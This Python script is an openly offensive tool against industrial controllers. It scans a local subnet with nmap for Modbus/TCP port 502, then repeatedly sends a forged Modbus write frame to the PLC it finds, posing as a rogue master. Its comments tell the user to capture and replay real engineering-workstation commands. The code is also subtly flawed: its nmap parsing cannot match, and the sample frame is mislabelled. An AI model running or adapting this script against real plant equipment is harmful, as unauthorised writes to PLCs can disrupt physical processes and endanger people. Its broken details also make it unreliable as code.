import socket
import struct
import time
import subprocess
import re

# Configuration - Modify these based on your specific PLC and network
PLC_DEFAULT_PORT = 502  # Most PLCs use Modbus/TCP on port 502.  Adjust if different.
ATTACK_COMMAND = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x00\x01'  # Example: Write to coil 1.  MODIFY THIS!
                                                                   # This is a placeholder. You *must* tailor this
                                                                   # to a valid command for *your* PLC.  Use a
                                                                   # protocol analyzer (e.g., Wireshark) to capture
                                                                   # legitimate commands from your engineering
                                                                   # workstation and replicate them.  Otherwise,
                                                                   # this will just send garbage data.
def find_plc_ip():
    """
    Attempts to discover the PLC's IP address using nmap.
    This is a very basic discovery method and might not work in all environments.
    Consider using a more robust network scanner or static configuration for production.
    """
    try:
        # Run nmap to scan the network for devices on the PLC's default port
        result = subprocess.run(['nmap', '-p', str(PLC_DEFAULT_PORT), '192.168.1.0/24'], capture_output=True, text=True, check=True) #CHANGE IP RANGE to match your network

        # Parse the nmap output to find the IP address
        output_lines = result.stdout.splitlines()
        for line in output_lines:
            if "open" in line and "tcp" in line:
                match = re.search(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                if match:
                    return match.group(1)
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        return None
    except FileNotFoundError:
        print("Nmap not found. Please install nmap and ensure it's in your system's PATH.")
        return None

    print("PLC IP address not found via nmap.  Consider static configuration.")
    return None


def send_rogue_command(plc_ip, command):
    """
    Sends a crafted command to the PLC, impersonating the master.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout to prevent indefinite blocking

        try:
            sock.connect((plc_ip, PLC_DEFAULT_PORT))
            print(f"Connected to PLC at {plc_ip}:{PLC_DEFAULT_PORT}")
        except socket.timeout:
            print(f"Connection to {plc_ip}:{PLC_DEFAULT_PORT} timed out.")
            return False
        except ConnectionRefusedError:
            print(f"Connection to {plc_ip}:{PLC_DEFAULT_PORT} refused.")
            return False
        except Exception as e:
            print(f"Error connecting to {plc_ip}:{PLC_DEFAULT_PORT}: {e}")
            return False


        sock.sendall(command)
        print(f"Sent rogue command: {command.hex()}")

        # Optionally, receive and process the PLC's response.  This depends on the protocol.
        try:
            response = sock.recv(1024)
            print(f"Received response: {response.hex()}")
            # Add error checking or response validation logic here based on the protocol.
            # For example, check if the response indicates success or failure.

        except socket.timeout:
            print("Timeout waiting for response from PLC.")
        except Exception as e:
            print(f"Error receiving response: {e}")


        sock.close()
        print("Connection closed.")
        return True

    except Exception as e:
        print(f"Error sending command: {e}")
        return False


def main():
    """
    Main function to find the PLC and send the rogue command.
    """
    plc_ip = find_plc_ip()

    if not plc_ip:
        print("Failed to find PLC IP address. Exiting.")
        return

    print(f"PLC IP address found: {plc_ip}")

    # Implement a loop or schedule to send commands repeatedly.  This mimics a rogue master.
    while True:
        success = send_rogue_command(plc_ip, ATTACK_COMMAND)
        if not success:
            print("Failed to send command.  Retrying in 5 seconds...")
        time.sleep(5) # Adjust sleep time as needed


if __name__ == "__main__":
    main()